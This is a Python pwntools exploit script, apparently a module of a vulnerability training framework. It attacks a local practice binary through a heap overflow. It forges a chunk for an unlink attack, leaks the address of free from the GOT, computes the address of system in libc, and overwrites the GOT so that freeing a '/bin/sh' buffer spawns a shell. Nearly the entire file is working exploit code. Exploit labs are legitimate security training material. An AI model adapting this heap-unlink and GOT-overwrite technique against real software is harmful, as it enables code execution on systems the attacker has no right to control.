#! /usr/bin/python
#coding:utf-8
'''Heap_Overflow - Ret2libc (ALSR - on)'''
import os
import sys

sys.path.append(os.path.abspath("../.."))
from modules import exploit
from pwn import *


class Exploit(exploit.VRL_Exploit):
    def __init__(self):
        self.name = 'heap_overflow'
        self.payload_info = 'DEP ON ASLR OFF'
        self.info = '''Exploit Name : heap_overflow
                       Exploit abstract :heap overflow 
                       Author : guoyingjie
                       Support change payload : false'''
        self.options = {'dIP':'127.0.0.1',
                        'dPort':'12345'}
        self.property = {
            'libc_free':0x0,# free address in symbols initialize 0
            'libc_sys':0x0,#system address in symbols initialize 0
            '&ptr':0x0,
            'free@got':0x0,
            }
        self.vulnerability= 'vulnerabilities/heap/vul_heap'
    def run(self):
        ip, port = self.options['dIP'], int(self.options['dPort'])
        p = remote(ip, port)

        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #get free address in symbols
        self.property['libc_free'] = libc.symbols['free']
        #get system address in symbols
        self.property['libc_sys'] = libc.symbols['system']


        libc = ELF('../../vulnerabilities/heap/heap64')
        self.property['free@got'] = libc.got['free']      #use free
        self.property['&ptr'] = libc.symbols['a'] + 8*2000

        print p.recvline() # choice  
        p.sendline('m')
        print p.recvline() # malloc
        print p.recvline() # size
        p.sendline('504')
        print p.recvline() # content
        p.sendline('aaa')
        print p.recvline() # ok

        print p.recvline() # choice
        p.sendline('m')
        print p.recvline() # malloc
        print p.recvline() # size
        p.sendline('504')
        print p.recvline() # content
        p.sendline('aaa')
        print p.recvline() # ok

        print p.recvline() # choice
        p.sendline('m')
        print p.recvline() # malloc
        print p.recvline() # size
        p.sendline('20')
        print p.recvline() # content
        p.sendline('/bin/sh')
        print p.recvline() # ok


        #关键payload
        print p.recvline() # choice
        p.sendline('e')
        print p.recvline() # edit
        p.sendline('0')
        payload = p64(0x0) + p64(0x1f9) + p64(self.property['&ptr'] - 0x18) + p64(self.property['&ptr'] - 0x10) + "a"*(504 - 40) + p64(0x200 - 16) + p64(0x200)
        p.sendline(payload)
        print p.recvline() # ok


        
        print p.recvline() # choice
        p.sendline('f')
        print p.recvline() # free
        p.sendline('1')
        print p.recvline() # ok


        print p.recvline() # choice
        p.sendline('e')
        print p.recvline() # edit
        p.sendline('0')
        p.sendline('a'*24 + p64(self.property['free@got']))
        print p.recvline() # ok

    # leak GOT
        print p.recvline() # choice
        p.sendline('p')
        print p.recvline() # print
        p.sendline('0')
        #free = u32(p.recv(6))#free address, receive low 4 byte
        free = p.recv(6)#because 64bit address begin with 0x0000 so we only read 6bytes
        #print free
        free_addr = u64(free+'\x00\x00')
        #free_addr = free + 0x0000000000000000 #add high address
        print p.recvline() # end
        print p.recvline()

        sys_addr = free_addr - self.property['libc_free'] + self.property['libc_sys']#get system address

        print '\t\tfree_addr = ' + hex(free_addr)
        print '\t\tsystem_addr = ' + hex(sys_addr)
       # sys_addr = sys_addr - 0x00007fff00000000 #get system address low 4B
        #print '\t\tsystem_addr = ' + hex(sys_addr)

        print p.recvline() # choice
        p.sendline('e')
        print p.recvline() # edit
        p.sendline('0')
    # overwrite GOT\
        #print p64(sys_addr)[0:6]
        p.sendline(p64(sys_addr)[0:6])
        print p.recvline() # ok

       # a=raw_input('debug:')
        print p.recvline() # choice
        p.sendline('f')
        print p.recvline() # free
        p.sendline('2')


        print "\tfree(a[2002]) ===> system('/bin/sh')"
  
       # p.interactive()




if __name__=='__main__':
 
    if '__init__.py' not in os.listdir(os.curdir):
        os.mknod('__init__.py')
    exp = Exploit()
    print 'Exploit: ',exp.name,' \n'
    print 'Checking:\n'
    if exp.check():
        print 'Running:\n'
        exp.run()



